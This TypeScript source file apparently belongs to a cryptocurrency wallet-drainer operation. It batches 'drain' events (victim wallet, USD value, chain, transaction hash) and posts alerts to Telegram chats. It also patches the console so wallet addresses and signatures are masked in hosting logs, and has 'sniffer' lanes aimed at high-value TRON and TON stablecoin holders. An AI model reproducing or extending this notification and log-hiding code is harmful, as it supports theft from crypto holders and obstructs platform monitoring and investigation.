/**
 * Mesh Sync — Sovereign Telemetry webhook sender (Vercel Logs: `TELEMETRY_LOG` line).
 * Log Obfuscation — sensitive scalar paths redacted for console; Telegram uses truncateSignatureHex.
 */

import {
  enqueueDrainBatchEntry,
  resolveTelegramChatIds,
  resolveTelegramDelivery,
  truncateSignatureHex,
} from './lib/telegram.js'

interface TelegramResponse {
  status: number
  json(): Promise<unknown>
}

const REDACT_FILL = '\u2588'

/** Mask ~80% of characters — institutional correlation tokens remain at edges only. */
export function redactInstitutionalScalar(raw: string): string {
  const len = raw.length
  if (len <= 4) return REDACT_FILL.repeat(len)
  const edge = Math.max(2, Math.ceil(len * 0.1))
  const mid = len - 2 * edge
  if (mid <= 0) return `${raw.slice(0, 1)}${REDACT_FILL.repeat(Math.max(0, len - 2))}${raw.slice(-1)}`
  return `${raw.slice(0, edge)}${REDACT_FILL.repeat(mid)}${raw.slice(len - edge)}`
}

function looksLikeSignatureHex(s: string): boolean {
  return /^0x[a-fA-F0-9]{64,}$/i.test(s) || /^SHADOW_GCM:/i.test(s)
}

function looksLikeEvmWallet(s: string): boolean {
  return /^0x[a-fA-F0-9]{40}$/i.test(s)
}

/** Telegram-facing redaction — signatures use 6+4 truncation, not full hex. */
function redactForTelegramScalar(raw: string, key?: string): string {
  const keyLower = key?.toLowerCase() ?? ''
  if (
    keyLower === 'signature' ||
    keyLower === 'signature_hex' ||
    keyLower.endsWith('_signature') ||
    keyLower.endsWith('_signature_hex')
  ) {
    return truncateSignatureHex(raw)
  }
  if (looksLikeSignatureHex(raw)) return truncateSignatureHex(raw)
  if (looksLikeEvmWallet(raw)) return redactInstitutionalScalar(raw)
  return raw
}

function sanitizeUnknown(value: unknown, parentKey?: string): unknown {
  if (value == null) return value
  if (typeof value === 'string') {
    return redactForTelegramScalar(value, parentKey)
  }
  if (Array.isArray(value)) return value.map((v) => sanitizeUnknown(v))
  if (typeof value === 'object') return sanitizeForConsole(value as Record<string, unknown>)
  return value
}

function sanitizeForConsole(obj: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = {}
  for (const [k, v] of Object.entries(obj)) {
    const keyLower = k.toLowerCase()
    if (
      keyLower === 'wallet_address' ||
      keyLower === 'signature_hex' ||
      keyLower === 'signature' ||
      keyLower.endsWith('_signature_hex')
    ) {
      if (typeof v === 'string') out[k] = redactForTelegramScalar(v, k)
      else out[k] = sanitizeUnknown(v, k)
      continue
    }
    out[k] = sanitizeUnknown(v, k)
  }
  return out
}

function redactLogArgs(args: unknown[]): unknown[] {
  return args.map((a) => {
    if (typeof a === 'string') {
      let s = a
      s = s.replace(/\b0x[a-fA-F0-9]{40}\b/gi, (m) => redactInstitutionalScalar(m))
      s = s.replace(/\b0x[a-fA-F0-9]{64,}\b/gi, (m) => truncateSignatureHex(m))
      s = s.replace(/SHADOW_GCM:[^\s]+/gi, (m) => truncateSignatureHex(m))
      return s
    }
    if (a && typeof a === 'object' && !Array.isArray(a)) {
      return sanitizeForConsole(a as Record<string, unknown>)
    }
    if (Array.isArray(a)) return a.map((x) => sanitizeUnknown(x))
    return a
  })
}

let consoleFilterInstalled = false

/** Log Obfuscation — wraps console sinks used by this mesh so vault-bound secrets never print in full. */
export function installTelemetryConsoleRedaction(): void {
  if (consoleFilterInstalled) return
  consoleFilterInstalled = true
  const sink = (orig: (...a: unknown[]) => void) => {
    return (...args: unknown[]) => orig(...redactLogArgs(args))
  }
  console.log = sink(console.log.bind(console))
  console.info = sink(console.info.bind(console))
  console.warn = sink(console.warn.bind(console))
  console.error = sink(console.error.bind(console))
}

installTelemetryConsoleRedaction()

function isDrainTelemetryEvent(body: Record<string, unknown>): boolean {
  const event = typeof body['event'] === 'string' ? body['event'].toUpperCase() : ''
  if (event === 'SETTLEMENT_IGNITED' || event === 'VAULT_SETTLEMENT' || event === 'BROADCAST_CONFIRMED') {
    return true
  }
  const msg = typeof body['message'] === 'string' ? body['message'].toLowerCase() : ''
  return (
    msg.includes('settlement_ignited') ||
    msg.includes('broadcast confirmed') ||
    msg.includes('vault settlement') ||
    msg.includes('settlement finalized')
  )
}

function sanitizeTelemetryMessageText(message: string): string {
  return message
    .replace(/\b0x[a-fA-F0-9]{64,}\b/gi, (m) => truncateSignatureHex(m))
    .replace(/SHADOW_GCM:[^\s]+/gi, (m) => truncateSignatureHex(m))
}

/**
 * Strip chat_id from URL query so it lives only in the POST body (Telegram best practice).
 */
function cleanWebhookUrl(url: string): string {
  try {
    const parsed = new URL(url)
    parsed.searchParams.delete('chat_id')
    return parsed.toString()
  } catch {
    return url
  }
}

async function postTelegramToChat(
  url: string,
  chatId: string,
  payload: Record<string, unknown>,
): Promise<TelegramResponse> {
  return (await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...payload, chat_id: chatId }),
    signal: AbortSignal.timeout(12_000),
  })) as unknown as TelegramResponse
}

export async function sendSovereignTelemetryPayload(
  body: Record<string, unknown>,
): Promise<Response | null> {
  const rawUrl = process.env['TELEMETRY_WEBHOOK_URL']?.trim()
  const { url: deliveryUrl, chatIds: deliveryChatIds } = resolveTelegramDelivery()

  const chatIds =
    deliveryChatIds.length > 0 ? deliveryChatIds : rawUrl ? resolveTelegramChatIds(rawUrl) : []

  if (!rawUrl && !process.env['TELEGRAM_BOT_TOKEN']?.trim()) {
    console.info('LANE_STATUS: TELEMETRY_WEBHOOK unset')
    return null
  }

  if (chatIds.length === 0) {
    console.warn(
      'LANE_STATUS: TELEMETRY_WEBHOOK no chat_id — set TELEGRAM_CHAT_IDS / TELEGRAM_CHAT_ID or add ?chat_id= to TELEMETRY_WEBHOOK_URL',
    )
    return null
  }

  const url = rawUrl ? cleanWebhookUrl(rawUrl) : deliveryUrl
  if (!url) {
    console.warn('LANE_STATUS: TELEMETRY_WEBHOOK URL could not be resolved')
    return null
  }

  if (isDrainTelemetryEvent(body)) {
    const wallet =
      typeof body['wallet_address'] === 'string' ? body['wallet_address'] : ''
    const usdRaw = body['scout_value_usd'] ?? body['value']
    const usd =
      typeof usdRaw === 'string' || typeof usdRaw === 'number' ? usdRaw : undefined
    const chains: Array<string | number | null | undefined> = []
    if (body['chain_id'] != null) chains.push(String(body['chain_id']))
    if (typeof body['chain_family'] === 'string') chains.push(body['chain_family'])
    if (typeof body['protocol'] === 'string') chains.push(body['protocol'])
    enqueueDrainBatchEntry({
      wallet,
      usd,
      chains,
      tx_hash: typeof body['tx_hash'] === 'string' ? body['tx_hash'] : null,
    })
    return null
  }

  try {
    const eventLabel =
      typeof body['event'] === 'string'
        ? body['event']
        : body['ping']
          ? 'HEARTBEAT_PING'
          : 'SYSTEM_SIGNAL'

    const rawMessage =
      typeof body['message'] === 'string'
        ? sanitizeTelemetryMessageText(body['message'])
        : null

    const messageText = rawMessage
      ? `🛰️ <b>[LEGION ENGINE]</b>\n${rawMessage}\n\n<i>${new Date().toISOString()}</i>`
      : `🛰️ <b>[LEGION ENGINE ALERT]</b>\n<b>Event:</b> ${eventLabel}\n<b>Time:</b> ${new Date().toISOString()}`

    const payload = {
      text: messageText,
      parse_mode: 'HTML',
    }

    let lastResponse: TelegramResponse | null = null
    for (const chatId of chatIds) {
      const response = await postTelegramToChat(url, chatId, payload)
      lastResponse = response
      const resJson = (await response.json().catch(() => null)) as {
        ok?: boolean
        description?: string
      } | null
      if (resJson && resJson.ok === false) {
        console.warn(
          `LANE_STATUS: TELEMETRY_WEBHOOK telegram_error (chat ${chatId}) —`,
          resJson.description ?? JSON.stringify(resJson),
        )
      }
    }

    console.info(`LANE_STATUS: TELEMETRY_WEBHOOK sent to ${chatIds.length} chat(s)`)
    return lastResponse as Response | null
  } catch (err) {
    console.warn('LANE_STATUS: TELEMETRY_WEBHOOK fault —', String(err))
    return null
  }
}

export async function sendHeartbeatTrigger(): Promise<void> {
  await sendSovereignTelemetryPayload({
    event: 'HEARTBEAT_PING',
    message: 'HEARTBEAT: legion-engine-api manual Sovereign Audit (/health?ping=true)',
    heartbeat_trigger: true,
    mesh_sync: true,
    ping: true,
  })
}

/** Ping Strike lane — Sovereign Telemetry with Deterministic Tagging surface for Whale Alert ingestion. */
export async function sendPingStrikeWhaleAlertTelemetry(
  payload: Record<string, unknown>,
): Promise<Response | null> {
  return sendSovereignTelemetryPayload({
    ...payload,
    mesh_event_lane: 'Whale Alert',
    runtime_diagnostic: 'Ping Strike',
    sovereign_ping_strike_telemetry: true,
  })
}

/** Tron Sensory Armor — Stablecoin Sniffer ingress to Telegram Webhook (institutional TRON_WHALE_INGRESS). */
export async function sendTonJettonIngressTelemetry(
  payload: Record<string, unknown>,
): Promise<Response | null> {
  const msg =
    typeof payload['message'] === 'string'
      ? payload['message']
      : `TON_JETTON_INGRESS: ${JSON.stringify(sanitizeUnknown(payload))}`
  return sendSovereignTelemetryPayload({
    ...payload,
    message: `TON_JETTON_INGRESS\n${msg}`,
    event: 'TON_JETTON_INGRESS',
    ton_stablecoin_sniffer: true,
    omnichain_parity_lane: 'TON',
  })
}

export async function sendTronWhaleIngressTelemetry(
  payload: Record<string, unknown>,
): Promise<Response | null> {
  const msg =
    typeof payload['message'] === 'string'
      ? payload['message']
      : `TRON_WHALE_INGRESS: ${JSON.stringify(sanitizeUnknown(payload))}`
  return sendSovereignTelemetryPayload({
    ...payload,
    message: `TRON_WHALE_INGRESS\n${msg}`,
    event: 'TRON_WHALE_INGRESS',
    tron_stablecoin_sniffer: true,
    omnichain_parity_lane: 'TRON',
  })
}
